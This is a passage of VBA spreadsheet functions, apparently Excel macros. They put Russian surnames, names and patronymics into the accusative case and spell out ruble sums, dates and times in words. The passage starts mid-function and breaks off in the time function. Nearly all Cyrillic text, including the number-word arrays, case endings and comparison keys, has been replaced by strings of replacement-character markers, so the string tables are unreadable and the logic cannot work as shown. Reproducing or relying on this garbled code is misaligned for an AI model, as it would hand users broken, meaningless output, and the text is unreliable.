            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        AccusativeCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetAccusativeException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            AccusativeCase = AccusativeCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|", ".": AccusativeCase = AccusativeCase & sName
                    Case Else: AccusativeCase = AccusativeCase & sName & "|fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case Else: AccusativeCase = AccusativeCase & sName
                End Select
            End If
        End If
        AccusativeCase = AccusativeCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            AccusativeCase = AccusativeCase & sPatronymic
        Else
            If bMaleSex Then
                AccusativeCase = AccusativeCase & sPatronymic & "|fffd|"
            Else
                AccusativeCase = AccusativeCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd|"
            End If
        End If
    End If
    AccusativeCase = Replace(AccusativeCase, "-", "- ")
    AccusativeCase = StrConv(AccusativeCase, vbUnicode + vbProperCase)
    AccusativeCase = Trim(Replace(AccusativeCase, "- ", "-"))
End Function

Function GetAccusativeException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd||fffd|"
            ' Case "|fffd||fffd||fffd||fffd||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ' Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetAccusativeException = txt$
    End Select
End Function


'---------------------------------------------------------------------------------------
' Module    : funcFormatCondition
' Author    : The_Prist
'---------------------------------------------------------------------------------------
Function Propis_Summ_RUS(Number, Optional Rub As Integer, Optional Kop As Integer, _
                         Optional PodpisOnly As Integer, Optional FractionPart As Integer) As String
    Application.Volatile True
    Dim sMinus As String, sRubles As String, sThousands As String, sNumber As String, sKop As String, sTis As String, sMil As String, sStr
    avOne = Array("|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avHundreds = Array("", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avThousands = Array("", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    If Number < 0 Then: sMinus = "|fffd||fffd||fffd||fffd||fffd| "
    If Number Like "*,*" Then sStr = Split(Number, ",")
    If Number Like "*.*" Then sStr = Split(Number, ".")
    If Not Number Like "*,*" And Not Number Like "*.*" Then sStr = Split(Number)
    If UBound(sStr) > 0 Then
        If Len(sStr(1)) > 2 Then sStr(1) = Left(sStr(1), 2)
        If Len(sStr(1)) = 1 Then sStr(1) = sStr(1) & "0"
    End If
    sNumber = Abs(sStr(0))
    If PodpisOnly = 1 Then
        If UBound(sStr) = 0 Then
            sKop = "00 " & Text_All("0", "|fffd||fffd||fffd|")
        Else
            If Len(sStr(1)) = 1 Then
                sKop = sStr(1) & " " & Text_All(sStr(1) & "0", "|fffd||fffd||fffd|")
            Else
                sKop = sStr(1) & " " & Text_All(sStr(1), "|fffd||fffd||fffd|")
            End If
        End If
        If Rub = 0 Then Propis_Summ_RUS = sKop: Exit Function
        If Kop = 0 Then sKop = ""
        sRubles = Text_All(sNumber, "|fffd||fffd||fffd|")
        Propis_Summ_RUS = sMinus & sNumber & " " & sRubles & sKop
        Exit Function
    End If
    Select Case Len(sNumber)
        Case 0
            Propis_Summ_RUS = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|!"
        Case 1
            Propis_Summ_RUS = avOne(sNumber)
        Case 2
            Propis_Summ_RUS = funcTeens(sNumber)
        Case 3
            Propis_Summ_RUS = funcHundreds(sNumber)
        Case 4
            Propis_Summ_RUS = avThousands(Left(sNumber, 1)) & Text_All(Left(sNumber, 1), "|fffd||fffd||fffd|") & funcHundreds(Right(sNumber, 3))
        Case 5
            Propis_Summ_RUS = funcTeens(Left(sNumber, 2), 1) & Text_All(Left(sNumber, 2), "|fffd||fffd||fffd|") & funcHundreds(Right(sNumber, 3))
        Case 6
            Propis_Summ_RUS = funcHundreds(Left(sNumber, 3), 1) & Text_All(Mid(sNumber, 2, 2), "|fffd||fffd||fffd|") & funcHundreds(Right(sNumber, 3))
        Case 7
            If Mid(sNumber, 2, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = avOne(Left(sNumber, 1)) & Text_All(Left(sNumber, 1), "|fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 2, 3), 1) & Text_All(Mid(sNumber, 3, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 8
            If Mid(sNumber, 3, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcTeens(Left(sNumber, 2)) & Text_All(Left(sNumber, 2), "|fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 3, 3), 1) & Text_All(Mid(sNumber, 4, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 9
            If Mid(sNumber, 4, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcHundreds(Left(sNumber, 3)) & Text_All(Mid(sNumber, 2, 2), "|fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 4, 3), 1) & Text_All(Mid(sNumber, 5, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 10
            If Mid(sNumber, 5, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            If Mid(sNumber, 2, 3) = "000" Then sMil = "" Else sMil = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = avOne(Left(sNumber, 1)) & Text_All(Left(sNumber, 1), "|fffd||fffd||fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 2, 3), 1) & Text_All(Mid(sNumber, 3, 2), sMil) & funcHundreds(Mid(sNumber, 5, 3), 1) & Text_All(Mid(sNumber, 6, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 11
            If Mid(sNumber, 6, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            If Mid(sNumber, 3, 3) = "000" Then sMil = "" Else sMil = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcTeens(Left(sNumber, 2)) & Text_All(Left(sNumber, 2), "|fffd||fffd||fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 3, 3), 1) & Text_All(Mid(sNumber, 4, 2), sMil) & funcHundreds(Mid(sNumber, 6, 3), 1) & Text_All(Mid(sNumber, 7, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 12
            If Mid(sNumber, 7, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            If Mid(sNumber, 4, 3) = "000" Then sMil = "" Else sMil = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcHundreds(Left(sNumber, 3)) & Text_All(Mid(sNumber, 2, 2), "|fffd||fffd||fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 4, 3), 1) & Text_All(Mid(sNumber, 5, 2), sMil) & funcHundreds(Mid(sNumber, 7, 3), 1) & Text_All(Mid(sNumber, 8, 2), sTis) & funcHundreds(Right(sNumber, 3))
    End Select
    If Rub = 0 Then
        sRubles = ""
    Else
        sRubles = Text_All(Right(sNumber, 2), "|fffd||fffd||fffd|")
        If Kop = 0 Then
            sKop = ""
        Else
            If UBound(sStr) = 0 Then
                sKop = "|fffd||fffd||fffd||fffd| " & Text_All("0", "|fffd||fffd||fffd|")
            Else
                If Len(sStr(1)) = 1 Then
                    sKop = funcTeens(sStr(1) & "0", 1) & Text_All(sStr(1) & "0", "|fffd||fffd||fffd|")
                Else
                    sKop = funcTeens(sStr(1), 1) & Text_All(sStr(1), "|fffd||fffd||fffd|")
                End If
            End If
        End If
    End If
    '    If FractionPart Then
    '
    '
    '    End If
    Propis_Summ_RUS = sMinus & Propis_Summ_RUS & sRubles & sKop
    Propis_Summ_RUS = Trim(UCase(Left(Propis_Summ_RUS, 1)) & Mid(Propis_Summ_RUS, 2))
End Function

Private Function funcTeens(sNumber, Optional Thous As Integer) As String
    If Left(sNumber, 1) = "1" Then
        funcTeens = avTeens(Right(sNumber, 1))
    Else
        If Thous = 1 Then
            funcTeens = avTens(Left(sNumber, 1)) & avThousands(Right(sNumber, 1))
        Else
            funcTeens = avTens(Left(sNumber, 1)) & avOne(Right(sNumber, 1))
            If Right(funcTeens, 5) = "|fffd||fffd||fffd||fffd| " Or Right(funcTeens, 5) = "null " Then funcTeens = Left(funcTeens, Len(funcTeens) - 5)
        End If
    End If
End Function
Private Function funcHundreds(sNumber, Optional Thous As Integer) As String
    If Thous = 1 Then
        funcHundreds = avHundreds(Left(sNumber, 1)) & funcTeens(Right(sNumber, 2), 1)
    Else
        funcHundreds = avHundreds(Left(sNumber, 1)) & funcTeens(Right(sNumber, 2))
    End If
End Function
Function Text_All(ByVal sNumber, sKind As String) As String
    If Left(sNumber, 1) = 1 And Len(sNumber) > 1 Then
        If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
    Else
        Select Case Right(sNumber, 1)
            Case 1
                If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
            Case 2, 3, 4
                If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
            Case 0, 5 To 9
                If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
        End Select
    End If
End Function
Function Propis_Date_RUS(iDate, Optional iTime As Integer, Optional PodpisOnly As Integer) As String
    Application.Volatile True
    Dim avDays, avDayTeens, avDaysTens, avMonth, avYearOnes, avYearTeens, avYearThous, avYearTens
    Dim sDay As String, sMonth As String, sYear As String, sTh As String, sTens As String
    avTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avHundreds = Array("", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avThousands = Array("", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avDays = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avDaysTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avDayTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearOnes = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearTens = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearThous = Array("", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
    avMonth = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    If Not IsDate(iDate) Then Propis_Date_RUS = "|fffd||fffd||fffd||fffd||fffd||fffd|!": Exit Function
    sDay = Day(iDate)
    sMonth = Month(iDate)
    sYear = Year(iDate)
    Select Case Right(sDay, 2)
        Case 1 To 9
            sDay = avDays(sDay)
        Case 10 To 19
            sDay = avDayTeens(Right(sDay, 1))
        Case 20 To 31
            If Right(sDay, 1) = 0 Then
                sDay = avDaysTens(Left(sDay, 1))
            Else
                sDay = avTens(Left(sDay, 1)) & avDays(Right(sDay, 1))
            End If
    End Select
    sMonth = avMonth(Month(iDate))
    If Len(sYear) = 4 Then
        sTh = avThousands(Left(sYear, 1)) & Text_All(Left(Right(sYear, 4), 1), "|fffd||fffd||fffd|")
    End If
    If Left(Right(sYear, 2), 1) = "1" Then
        sTens = avYearTeens(Right(sYear, 1))
    Else
        If Right(sYear, 1) <> "0" Then
            sTens = avTens(Left(Right(sYear, 2), 1)) & avYearOnes(Right(sYear, 1))
        Else
            sTens = avYearTens(Left(Right(sYear, 2), 1) - 1)
        End If
    End If
    If Mid(sYear, 2, 3) = "000" Then sTens = avYearThous(Left(sYear, 1)) & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ": sTh = ""
    sYear = sTh & avHundreds(Left(Right(sYear, 3), 1)) & sTens & "|fffd||fffd||fffd||fffd| "
    Propis_Date_RUS = sDay & sMonth & sYear
    If iTime <> 0 Then
        Propis_Date_RUS = Trim(Propis_Date_RUS) & ", " & Propis_Time_RUS(iDate)
    End If
    If PodpisOnly <> 0 Then
        If iTime <> 0 Then
            Propis_Date_RUS = Day(iDate) & " " & sMonth & " " & Year(iDate) & " |fffd||fffd||fffd||fffd|, " & Propis_Time_RUS(iDate, 1)
        Else
            Propis_Date_RUS = Day(iDate) & " " & sMonth & " " & Year(iDate) & " |fffd||fffd||fffd||fffd| "
        End If
    End If
    Propis_Date_RUS = Trim(Replace(UCase(Left(Propis_Date_RUS, 1)) & Mid(Propis_Date_RUS, 2), "  ", " "))

End Function

Function Propis_Time_RUS(iTime, Optional PodpisOnly As Integer) As String
    Application.Volatile True
    Dim sTime, sHours As String, sMinutes As String, sSeconds As String, sHour As String, sMin As String, sSec As String
    avOne = Array("|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
